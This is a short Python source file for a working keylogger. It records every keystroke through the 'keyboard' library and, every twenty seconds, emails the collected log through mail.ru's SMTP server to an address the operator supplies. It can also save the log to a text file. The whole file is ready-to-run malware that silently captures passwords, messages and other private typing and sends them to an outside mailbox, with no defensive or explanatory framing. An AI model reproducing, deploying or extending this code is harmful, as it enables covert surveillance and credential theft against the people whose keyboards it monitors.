from datetime import datetime
from threading import Timer
import keyboard
import smtplib
send_report_every = 20
email_adress = 'your email' #mail.ru
email_password = 'your password' #needs password for another apps
class keylogger():
    def __init__(self,interval,report_method='email'):
        self.interval = interval
        self.report_method = report_method
        self.log = ''
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self,event):
        name = event.name
        if len(name) > 1:
                if name == 'space':
                    name = ' '
                elif name == 'enter':
                    name = '[ENTER]\n'
                elif name == 'decimal':
                    name = '.'
                else:
                    name = name.replace(' ', '_')
                    name = f'[{name.upper()}]'
        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(' ','-').replace(':','')
        end_dt_str = str(self.end_dt)[:-7].replace(' ','-').replace(':','')
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def sendmail(self, email, password, message):
        server = smtplib.SMTP_SSL('smtp.mail.ru', 465)
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(email_adress, email_password, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()
if __name__ == "__main__":
    keylogger = keylogger(interval=send_report_every, report_method="email")
    keylogger.start()